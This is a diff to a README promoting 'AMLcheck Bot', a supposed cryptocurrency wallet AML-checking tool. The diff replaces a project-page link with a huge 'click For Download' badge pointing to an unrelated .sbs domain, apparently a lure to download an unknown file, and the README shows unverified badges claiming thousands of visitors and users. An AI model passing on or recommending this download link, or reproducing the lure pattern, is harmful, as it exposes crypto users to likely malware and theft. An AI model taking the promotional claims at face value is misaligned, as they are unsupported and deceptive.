@@ -2,11 +2,15 @@
 
 AMLcheck Bot is a cutting-edge online tool designed to quickly verify the AML status of cryptocurrency wallets and transactions. In 2025, staying compliant is crucial—our bot offers instant risk assessment, transaction analysis, and wallet reputation checks with an easy interface and high security standards. Perfect for traders, exchanges, and crypto enthusiasts wanting peace of mind.
 
-<div style="text-align: center">
-  <a href="https://amlcheck-bot.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Visit AMLcheck Bot" src="https://img.shields.io/badge/Visit-AMLcheck_Bot-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Users: 5K+](https://img.shields.io/badge/Users-5K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
